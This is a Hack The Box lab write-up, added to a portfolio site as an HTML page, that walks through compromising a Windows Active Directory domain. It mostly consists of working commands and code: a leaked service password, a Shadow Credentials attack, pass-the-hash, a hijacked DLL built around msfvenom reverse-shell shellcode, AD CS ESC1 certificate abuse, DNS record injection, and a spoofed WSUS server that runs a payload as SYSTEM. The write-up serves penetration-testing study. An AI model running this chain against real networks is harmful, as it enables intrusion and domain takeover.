@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logging Machine Writeup | Koussay Aydi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
+    <div class="scroll-progress" id="scrollProgress"></div>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="../index.html">Back to Portfolio</a>
+        </nav>
+        <div class="topbar-actions">
+            <button id="mobileMenuBtn" class="icon-btn mobile-menu-btn" aria-label="Open mobile menu"><i class="fas fa-bars"></i></button>
+        </div>
+    </header>
+    <div class="mobile-nav" id="mobileNav" aria-hidden="true">
+            <a href="../index.html">Back to Portfolio</a>
+    </div>
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Windows Medium</span>
+            <h1>HTB — Logging Machine Writeup</h1>
+            <p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Windows Server 2019 | <strong>Written by:</strong> Atrox | <strong>Domain:</strong> logging.htb | <strong>DC:</strong> DC01.logging.htb</p>
+            <p><strong>Given Credentials:</strong> <code>wallace.everette / Welcome2026@</code></p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>1. Reconnaissance</h2>
+
+            <h3>Environment Setup</h3>
+            <pre><code class="language-bash"># Add target to /etc/hosts
+echo "$ip_target logging.htb DC01.logging.htb" >> /etc/hosts
+
+# Configure Kerberos
+cat > /etc/krb5.conf << EOF
+[libdefaults]
+    default_realm = LOGGING.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false 
+    ticket_lifetime = 24h
+    forwardable = true
+
+[realms]
+    LOGGING.HTB = {
+        kdc = DC01.logging.htb
+        admin_server = DC01.logging.htb
+    }
+
+[domain_realm]
+    .logging.htb = LOGGING.HTB
+    logging.htb = LOGGING.HTB
+EOF
+</code></pre>
+
+            <h3>Port Scan</h3>
+            <pre><code class="language-bash">
+nmap -sV -sC -p- --min-rate 5000 -T4 $ip_target</code></pre>
+
+            <p><strong>Open Ports:</strong></p>
+            <table>
+                <thead>
+                    <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>53</td><td>DNS</td><td>Active Directory DNS</td></tr>
+                    <tr><td>80</td><td>IIS 10.0</td><td>Default page only</td></tr>
+                    <tr><td>88</td><td>Kerberos</td><td>AD authentication</td></tr>
+                    <tr><td>135/139/445</td><td>RPC/SMB</td><td>Windows file sharing</td></tr>
+                    <tr><td>389/636/3268/3269</td><td>LDAP/LDAPS</td><td>Active Directory</td></tr>
+                    <tr><td>464</td><td>kpasswd</td><td>Kerberos password change</td></tr>
+                    <tr><td>593</td><td>RPC over HTTP</td><td></td></tr>
+                    <tr><td>5985</td><td>WinRM</td><td>Remote management</td></tr>
+                    <tr><td>8530/8531</td><td>WSUS HTTP/HTTPS</td><td>Windows Update Services</td></tr>
+                </tbody>
+            </table>
+
+            <h3>Web Enumeration</h3>
+            <pre><code class="language-bash">gobuster dir -u http://$ip_target:8530/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x aspx,asp -t 50
+</code></pre>
+
+            <p><strong>Found:</strong></p>
+            <ul>
+                <li><code>/inventory</code> (HTTP 301) — empty ASP.NET endpoint</li>
+                <li><code>/content</code> (HTTP 403)</li>
+            </ul>
+
+            <p><strong>WSUS SOAP endpoints discovered:</strong></p>
+            <ul>
+                <li><code>GET /ClientWebService/client.asmx</code> → 200 (unauthenticated)</li>
+                <li><code>GET /SimpleAuthWebService/SimpleAuth.asmx</code> → 200 (unauthenticated)</li>
+                <li><code>GET /ApiRemoting30/WebService.asmx</code> → 401 (requires auth)</li>
+            </ul>
+
+            <hr>
+
+            <h2>2. SMB Enumeration & Credential Discovery</h2>
+
+            <h3>Share Listing</h3>
+            <pre><code class="language-bash">smbclient -L //$ip_target/ -U 'logging.htb\wallace.everette%Welcome2026@'
+</code></pre>
+
+            <table>
+                <thead>
+                    <tr><th>Share</th><th>Type</th><th>Notes</th></tr>
+                </thead>
+                <tbody> 
+                    <tr><td>ADMIN$</td><td>Disk</td><td>Remote Admin</td></tr>
+                    <tr><td>C$</td><td>Disk</td><td>Default share</td></tr>
+                    <tr><td>IPC$</td><td>IPC</td><td>Remote IPC</td></tr>
+                    <tr><td><strong>Logs</strong></td><td>Disk</td><td><strong>Non-standard — target</strong></td></tr>
+                    <tr><td>NETLOGON</td><td>Disk</td><td>Logon server share</td></tr>
+                    <tr><td>SYSVOL</td><td>Disk</td><td>Logon server share</td></tr>
+                    <tr><td>WSUSTemp</td><td>Disk</td><td>WSUS temporary files</td></tr>
+                </tbody>
+            </table>
+
+            <h3>Download Logs Share</h3>
+            <pre><code class="language-bash">mkdir -p ~/htb/logging/Logs
+cd ~/htb/logging/Logs
+smbclient //$ip_target/Logs \
+  -U 'logging.htb\wallace.everette%Welcome2026@' \
+  -c 'recurse ON; prompt OFF; mget *'
+</code></pre>
+
+            <p><strong>Files found:</strong></p>
+            <ul>
+                <li><code>Audit_Heartbeat.log</code> (1294 bytes)</li>
+                <li><code>IdentitySync_Trace_20260219.log</code> (8488 bytes) ← <strong>Critical</strong></li>
+                <li><code>Service_State.log</code> (468 bytes)</li>
+                <li><code>TaskMonitor.log</code> (1170 bytes)</li>
+            </ul>
+
+            <h3>Credential Leak in Trace Log</h3>
+            <pre><code class="language-bash">grep -iE 'password|bindpass|credential' ~/htb/logging/Logs/*.log
+</code></pre>
+
+            <p><strong>Found in <code>IdentitySync_Trace_20260219.log</code>:</strong></p>
+            <pre><code>[VERBOSE] ConnectionContext Dump: {
+  Domain: "logging.htb",
+  Server: "DC01",
+  BindUser: "LOGGING\svc_recovery",
+  BindPass: "Em3rg3ncyPa$$2026",   ← Cleartext password!
+  Timeout: 30
+}
+</code></pre>
+
+            <blockquote>
+                <p><strong>Note:</strong> The log initially showed <code>Em3rg3ncyPa$$2025</code> but the password was rotated on <strong>April 16, 2026</strong> (decoded from <code>pwdLastSet</code> Windows FILETIME). The correct password is <strong><code>Em3rg3ncyPa$$2026</code></strong>.</p>
+            </blockquote>
+
+            <hr>
+
+            <h2>3. LDAP Enumeration</h2>
+            <pre><code class="language-bash">ldapsearch -x -H ldap://$ip_target \
+  -D 'wallace.everette@logging.htb' \
+  -w 'Welcome2026@' \
+  -b 'DC=logging,DC=htb' \
+  '(objectClass=user)' sAMAccountName userAccountControl memberOf
+</code></pre>
+
+            <h3>Key Users</h3>
+            <table>
+                <thead>
+                    <tr><th>Account</th><th>Groups</th><th>UAC</th><th>Notes</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>Administrator</code></td><td>Domain Admins, Enterprise Admins</td><td>66048</td><td>Target</td></tr>
+                    <tr><td><code>svc_recovery</code></td><td><strong>Emergency Recovery</strong>, Protected Users</td><td>66048</td><td>Credential found</td></tr>
+                    <tr><td><code>jaylee.clifton</code></td><td><strong>IT</strong>, Performance Log Users</td><td>66048</td><td>IT group = cert enroll rights</td></tr>
+                    <tr><td><code>msa_health$</code></td><td>(MSA)</td><td>4096</td><td>Managed Service Account</td></tr>
+                    <tr><td><code>toby.brynleigh</code></td><td>Domain Admins</td><td>66048</td><td>DA account</td></tr>
+                    <tr><td><code>wallace.everette</code></td><td>Domain Admins (nominal)</td><td>66048</td><td>Given account — constrained</td></tr>
+                </tbody>
+            </table>
+
+            <blockquote>
+                <p><strong>Key insight:</strong> <code>wallace.everette</code> is listed as DA but cannot DCSync, reset passwords, or write to C$. The DA membership is cosmetic.</p>
+            </blockquote>
+
+            <blockquote>
+                <p><strong>Key insight:</strong> <code>svc_recovery</code> is in <strong>Protected Users</strong> — no NTLM auth, Kerberos only. WinRM via password fails.</p>
+            </blockquote>
+
+            <hr>
+
+            <h2>4. BloodHound Analysis</h2>
+            <pre><code class="language-bash"># Sync clock first
+sudo ntpdate $ip_target
+
+# Collect BloodHound data
+bloodhound-python -u wallace.everette -p 'Welcome2026@' \
+  -d logging.htb -dc DC01.logging.htb \
+  -ns $ip_target -c All --zip --auth-method kerberos
+</code></pre>
+
+            <h3>Attack Path Identified</h3>
+            <pre><code>SVC_RECOVERY ──[GenericWrite]──► MSA_HEALTH$ ──[CanPSRemote]──► DC01
+                                      │
+                                 [DCSync] ──► LOGGING.HTB (Domain)
+</code></pre>
+            <ul>
+                <li><code>svc_recovery</code> → <strong>GenericWrite</strong> on <code>msa_health$</code> → Shadow Credentials attack</li>
+                <li><code>msa_health$</code> → <strong>CanPSRemote</strong> on DC01 → WinRM access</li>
+                <li><code>msa_health$</code> → <strong>DCSync</strong> rights → dump all hashes</li>
+            </ul>
+
+            <hr>
+
+            <h2>5. Initial Access — svc_recovery</h2>
+
+            <h3>Clock Synchronization (Required for Kerberos)</h3>
+            <pre><code class="language-bash">sudo ntpdate $ip_target
+</code></pre>
+
+            <blockquote>
+                <p><strong>Important:</strong> Always sync clock before Kerberos operations. If system clock drifts, use <code>faketime -f "+7 hours"</code> prefix for all commands.</p>
+            </blockquote>
+            <h3>Get TGT for svc_recovery</h3><pre><code class="language-bash">impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' \
+  -dc-ip $ip_target
+export KRB5CCNAME=svc_recovery.ccache
+klist
+</code></pre>
+
+            <blockquote>
+                <p><strong>Note:</strong> <code>svc_recovery</code> is in <strong>Protected Users</strong> group:</p>
+                <ul>
+                    <li>❌ No NTLM authentication</li>
+                    <li>❌ No CredSSP/Digest/Basic</li>
+                    <li>✅ Kerberos only</li>
+                    <li>WinRM requires <code>Remote Management Users</code> group membership — svc_recovery is NOT in this group</li>
+                </ul>
+            </blockquote>
+
+            <hr>
+
+            <h2>6. Shadow Credentials — msa_health$</h2>
+            <p>Since <code>svc_recovery</code> has <strong>GenericWrite</strong> on <code>msa_health$</code>, we can perform a Shadow Credentials attack to obtain <code>msa_health$</code>'s NT hash.</p>
+            <pre><code class="language-bash">export KRB5CCNAME=svc_recovery.ccache
+
+faketime -f "+7 hours" certipy-ad shadow auto \
+  -k -no-pass \
+  -username svc_recovery@logging.htb \
+  -account 'msa_health$' \
+  -target DC01.logging.htb \
+  -dc-ip $ip_target
+</code></pre>
+
+            <p><strong>Output:</strong></p>
+            <pre><code>[*] Successfully added Key Credential with device ID '...' to msa_health$
+[*] Got TGT
+[*] Saved credential cache to 'msa_health.ccache'
+[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
+</code></pre>
+
+            <h3>WinRM as msa_health$ (Pass-the-Hash)</h3>
+            <p><code>msa_health$</code> is in <strong>Remote Management Users</strong> — WinRM works with NTLM PTH:</p>
+            <pre><code class="language-bash">  evil-winrm -i $ip_target   -u 'msa_health$'   -H 603fc24ee01a9409f83c9d1d701485c5
+</code></pre>
+
+            <hr>
+
+            <h2>7. DLL Hijacking — jaylee.clifton</h2>
+
+            <h3>Discovery</h3>
+            <p>From the msa_health$ WinRM shell:</p>
+            <pre><code class="language-powershell"># Find UpdateMonitor scheduled task
+dir "C:\Program Files\UpdateMonitor\"
+type "C:\ProgramData\UpdateMonitor\Logs\monitor.log"
+</code></pre>
+
+            <p><strong>UpdateMonitor behavior (from logs):</strong></p>
+            <ol>
+                <li>Runs as <code>jaylee.clifton</code> every <strong>3 minutes</strong></li>
+                <li>Checks for <code>C:\ProgramData\UpdateMonitor\Settings_Update.zip</code></li>
+                <li>If found, extracts and loads <code>settings_update.dll</code> from <code>C:\Program Files\UpdateMonitor\bin\</code></li>
+                <li>Calls exported function <code>PreUpdateCheck</code> from the DLL</li>
+            </ol>
+
+            <h3>Craft Malicious DLL</h3>
+            <pre><code class="language-bash">
+LHOST="$ip_kali"
+
+# Generate 32-bit reverse shell shellcode
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=$LHOST LPORT=$LPORT \
+  -f c -v shellcode > /tmp/shellcode.h
+
+# Write DLL source with PreUpdateCheck export
+cat > ~/htb/logging/settings_update.c << 'EOF'
+#include <windows.h>
+#include <stdlib.h>
+
+// SHELLCODE_HERE (paste msfvenom output)
+
+__declspec(dllexport) void PreUpdateCheck(void) {
+    void *exec = VirtualAlloc(NULL, sizeof(shellcode),
+                              MEM_COMMIT | MEM_RESERVE,
+                              PAGE_EXECUTE_READWRITE);
+    if (exec) {
+        memcpy(exec, shellcode, sizeof(shellcode));
+        HANDLE hThread = CreateThread(NULL, 0,
+                         (LPTHREAD_START_ROUTINE)exec,
+                         NULL, 0, NULL);
+        if (hThread) WaitForSingleObject(hThread, 30000);
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+                      DWORD ul_reason_for_call,
+                      LPVOID lpReserved) {
+    return TRUE;
+}
+EOF
+
+# Compile as 32-bit (UpdateMonitor.exe is 32-bit)
+i686-w64-mingw32-gcc -shared -o settings_update.dll settings_update.c
+
+# Verify architecture and export
+file settings_update.dll
+# Expected: PE32 executable (DLL) Intel 80386
+
+i686-w64-mingw32-objdump -p settings_update.dll | grep PreUpdateCheck
+# Expected: [0] +base[1] 0000 PreUpdateCheck
+
+# Create zip
+zip Settings_Update.zip settings_update.dll
+</code></pre>
+
+            <h3>Upload and Execute</h3>
+            <pre><code class="language-bash"># Start listener
+nc -lvnp 4444
+</code></pre>
+
+            <pre><code class="language-powershell"># In msa_health$ evil-winrm shell
+cd C:\ProgramData\UpdateMonitor
+upload Settings_Update.zip
+
+# Watch log for execution
+while($true) {
+    Get-Date
+    type C:\ProgramData\UpdateMonitor\Logs\monitor.log | Select-Object -Last 5
+    Start-Sleep 15
+}
+</code></pre>
+
+            <p><strong>Expected log output:</strong></p>
+            <pre><code>[*] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
+[*] Loading update applier: ...settings_update.dll
+[*] Calling 'PreUpdateCheck' in settings_update.dll
+</code></pre>
+
+            <p><strong>Result:</strong> Reverse shell as <code>jaylee.clifton</code> on port 4444.</p>
+
+            <h3>User Flag</h3>
+            <pre><code class="language-cmd">type C:\Users\jaylee.clifton\Desktop\user.txt
+</code></pre>
+
+            <hr>
+
+            <h2>8. AD CS ESC1 — UpdateSrv Template</h2>
+
+            <h3>Certificate Template Enumeration</h3>
+            <pre><code class="language-bash"># Get jaylee's TGT via Rubeus tgtdeleg (from her shell)
+# In jaylee's shell:
+.\Rubeus.exe tgtdeleg /nowrap
+# Copy base64 ticket
+
+# On Kali - convert kirbi to ccache
+echo "&lt;BASE64_TICKET&gt;" | base64 -d > jaylee.clifton.kirbi
+impacket-ticketConverter jaylee.clifton.kirbi jaylee.clifton.ccache
+export KRB5CCNAME=jaylee.clifton.ccache
+</code></pre>
+
+            <h3>Vulnerable Template: UpdateSrv</h3>
+            <table>
+                <thead>
+                    <tr><th>Property</th><th>Value</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Template Name</td><td><code>UpdateSrv</code></td></tr>
+                    <tr><td>Enrollment Rights</td><td><code>LOGGING.HTB\IT</code> ← jaylee is in IT</td></tr>
+                    <tr><td>Enrollee Supplies Subject</td><td><strong>True (ESC1)</strong></td></tr>
+                    <tr><td>Extended Key Usage</td><td>Server Authentication</td></tr>
+                    <tr><td>Manager Approval</td><td>Not required</td></tr>
+                </tbody>
+            </table>
+
+            <h3>Request WSUS Certificate</h3>
+            <pre><code class="language-bash">faketime -f "+7 hours" certipy-ad req \
+  -k -no-pass \
+  -ca logging-DC01-CA \
+  -template UpdateSrv \
+  -upn wsus.logging.htb \
+  -dns wsus.logging.htb \
+  -target DC01.logging.htb \
+  -dc-ip $ip_target
+</code></pre>
+
+            <p><strong>Output:</strong></p>
+            <pre><code>[*] Successfully requested certificate
+[*] Got certificate with multiple identifications
+    UPN: 'wsus.logging.htb'
+    DNS Host Name: 'wsus.logging.htb'
+[*] Saved certificate and private key to 'wsus.logging.htb_wsus.pfx'
+</code></pre>
+
+            <h3>Extract Cert and Key</h3>
+            <pre><code class="language-bash">certipy-ad cert -pfx wsus.logging.htb_wsus.pfx -nokey -out wsus.crt
+certipy-ad cert -pfx wsus.logging.htb_wsus.pfx -nocert -out wsus.key
+</code></pre>
+
+            <hr>
+
+            <h2>9. WSUS Spoofing — Domain Admin</h2>
+
+            <h3>Context</h3>
+            <p>From the incident ticket found at <code>C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html</code>:</p>
+            <blockquote>
+                <p>DC01 is configured to check for updates at <code>https://wsus.logging.htb:8531/</code> with a <strong>120-second ForceSync loop</strong></p>
+            </blockquote>
+            <pre><code class="language-powershell"># Verified via registry
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
+# WUServer = https://wsus.logging.htb:8531
+# UseWUServer = 1
+</code></pre>
+
+            <h3>Step 1 — Add DNS Record</h3>
+            <pre><code class="language-bash"># Add wsus.logging.htb → attacker IP in DC's DNS
+cd /opt/krbrelayx   # git clone https://github.com/dirkjanm/krbrelayx.git
+faketime -f "+7 hours" python3 dnstool.py   -u 'logging.htb\wallace.everette'   -p 'Welcome2026@'   --action add   --record wsus   --data $ip_kali   --type A   $ip_target
+
+# If record is tombstoned, fix it via ldap3
+faketime -f "+7 hours" python3 << 'EOF'
+import ldap3, struct, socket
+
+server = ldap3.Server('$ip_target', get_info=ldap3.ALL)
+conn = ldap3.Connection(server,
+    user='logging.htb\\wallace.everette',
+    password='Welcome2026@',
+    authentication=ldap3.NTLM)
+conn.bind() 
+
+ip = socket.inet_aton('$ip_kali')
+dns_record = struct.pack('<HHHIIHHI',
+    4, 1, 0xF0, 0, 180, 900, 0, 0) + ip
+
+dn = 'DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb'
+conn.modify(dn, {
+    'dnsRecord': [(ldap3.MODIFY_REPLACE, [dns_record])],
+    'dNSTombstoned': [(ldap3.MODIFY_REPLACE, [False])]
+})
+print(f"[+] Result: {conn.result['description']}")
+EOF
+# Verify DNS resolution
+nslookup wsus.logging.htb $ip_target
+# Expected: Address: $ip_kali
+
+</code></pre>
+
+            <h3>Step 2 — Generate Reverse Shell Payload</h3>
+            <pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=$ip_kali LPORT=5555 \
+  -f exe -o ~/htb/logging/rev.exe
+</code></pre>
+
+            <h3>Step 3 — Start Listener</h3>
+            <pre><code class="language-bash">nc -lvnp 5555
+</code></pre>
+
+            <h3>Step 4 — Setup Fake WSUS Server</h3>
+            <pre><code class="language-bash">cd ~/htb/logging
+
+# Enable nftables (required by wsuks)
+sudo systemctl enable nftables
+sudo systemctl start nftables
+
+# Start wsuks fake WSUS server
+sudo wsuks serve \
+  --cert wsus.crt \
+  --key wsus.key \
+  --executable PsExec64.exe \
+  --command "-accepteula -s -d C:\Windows\Temp\rev.exe"
+</code></pre>
+
+            <blockquote>
+                <p><strong>How it works:</strong> wsuks listens on port 8531 with our trusted certificate. When DC01 connects to <code>https://wsus.logging.htb:8531/</code> for its update check, it trusts our certificate (signed by <code>logging-DC01-CA</code>). wsuks serves a malicious update that executes <code>PsExec64.exe</code> as SYSTEM, which runs our <code>rev.exe</code> reverse shell.</p>
+            </blockquote>
+
+            <h3>Step 5 — Upload Payload to DC (via msa_health$)</h3>
+            <pre><code class="language-powershell"># In msa_health$ evil-winrm
+upload rev.exe C:\Windows\Temp\rev.exe
+
+# Trigger update check
+Start-Process "wuauclt.exe" -ArgumentList "/detectnow /updatenow" -NoNewWindow
+Start-Process "usoclient.exe" -ArgumentList "StartScan" -NoNewWindow
+</code></pre>
+
+            <h3>Step 6 — Receive SYSTEM Shell</h3>
+            <p>The DC checks for updates every <strong>120 seconds</strong> automatically. When it connects to our fake WSUS server:</p>
+            <pre><code>wsuks output:
+[*] DC connected from $ip_target
+[*] Serving malicious update...
+[*] Payload executed as SYSTEM
+</code></pre>
+            <pre><code>nc -lvnp 5555
+connect from $ip_target
+C:\Windows\system32> whoami
+nt authority\system
+</code></pre>
+
+            <h3>Root Flag</h3>
+            <pre><code class="language-cmd">type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+
+            <hr>
+
+            <h2>Attack Chain Summary</h2>
+            <pre><code>wallace.everette (given creds)
+    │
+    ▼
+SMB: Logs share → IdentitySync_Trace.log
+    │
+    └─► svc_recovery : Em3rg3ncyPa$$2026 (cleartext in log)
+            │
+            ▼
+        Kerberos TGT (svc_recovery in Protected Users — no NTLM)
+            │
+            ▼
+        GenericWrite on msa_health$ → Shadow Credentials Attack
+            │
+            ▼
+        msa_health$ NT hash: 603fc24ee01a9409f83c9d1d701485c5
+            │
+            ▼
+        evil-winrm PTH as msa_health$ (in Remote Management Users)
+            │
+            ▼
+        Upload Settings_Update.zip → DLL Hijack via UpdateMonitor
+            │
+            ▼
+        Reverse shell as jaylee.clifton ← USER FLAG
+            │
+            ▼
+        Rubeus tgtdeleg → jaylee TGT → certipy ESC1
+        UpdateSrv template (IT group enroll) → wsus.logging.htb cert
+            │
+            ▼
+        DNS record: wsus.logging.htb → $ip_kali
+        wsuks fake WSUS server with trusted cert
+            │
+            ▼
+        DC connects → malicious update → SYSTEM shell ← ROOT FLAG
+</code></pre>
+
+            <hr>
+
+            <h2>Key Tools & Commands Reference</h2>
+            <pre><code class="language-bash"># Clock sync (always do this first)
+sudo ntpdate $ip_target
+
+# Kerberos TGT
+impacket-getTGT logging.htb/USER:'PASS' -dc-ip $ip_target
+export KRB5CCNAME=user.ccache
+
+# Shadow Credentials
+faketime -f "+7 hours" certipy-ad shadow auto \
+  -k -no-pass -username USER@logging.htb \
+  -account TARGET -target DC01.logging.htb -dc-ip $ip_target
+
+# BloodHound
+bloodhound-python -u USER -p PASS -d logging.htb \
+  -dc DC01.logging.htb -ns $ip_target -c All --zip
+
+# AD CS cert request (ESC1)
+faketime -f "+7 hours" certipy-ad req \
+  -k -no-pass -ca logging-DC01-CA -template UpdateSrv \ 
+  -dns wsus.logging.htb -target DC01.logging.htb 
+# DNS record via krbrelayx
+python3 /opt/krbrelayx/dnstool.py \
+  -u 'logging.htb\USER' -p 'PASS' \
+  --action add --record wsus --data $ip_kali --type A $ip_target
+
+# DLL compile (32-bit with export)
+i686-w64-mingw32-gcc -shared -o settings_update.dll settings_update.c
+
+# Fake WSUS server
+sudo wsuks serve --cert wsus.crt --key wsus.key \
+  --executable PsExec64.exe \
+  --command "-accepteula -s -d C:\Windows\Temp\rev.exe"
+</code></pre>
+
+            <hr>
+
+            <h2>Lessons Learned</h2>
+            <table>
+                <thead>
+                    <tr><th>Finding</th><th>Technique</th><th>Impact</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Cleartext creds in VERBOSE logs</td><td>SMB share enumeration</td><td>Initial foothold</td></tr>
+                    <tr><td>Protected Users blocks NTLM</td><td>Kerberos-only auth with faketime</td><td>Auth bypass</td></tr>
+                    <tr><td>Password rotation</td><td>Check pwdLastSet (year 2026 not 2025)</td><td>Correct creds</td></tr>
+                    <tr><td>Shadow Credentials</td><td>GenericWrite → certipy shadow auto</td><td>Lateral movement</td></tr>
+                    <tr><td>DLL Hijacking</td><td>Scheduled task loads user-supplied DLL</td><td>User pivot</td></tr>
+                    <tr><td>AD CS ESC1</td><td>IT group enroll on UpdateSrv</td><td>WSUS cert</td></tr>
+                    <tr><td>WSUS Spoofing</td><td>Trusted cert + fake server</td><td>DA/SYSTEM</td></tr>
+                    <tr><td>DNS tombstoning</td><td>ldap3 modify to reactivate</td><td>DNS manipulation</td></tr>
+                </tbody>
+            </table>
+
+            <div style="margin-top: 50px; text-align: center;">
+                <a href="../index.html" class="btn btn-primary"><i class="fas fa-arrow-left"></i> Return Home</a>
+            </div>
+        </article>
+    </main>
+    <script src="../script.js"></script>
+</body>
+</html>
+```
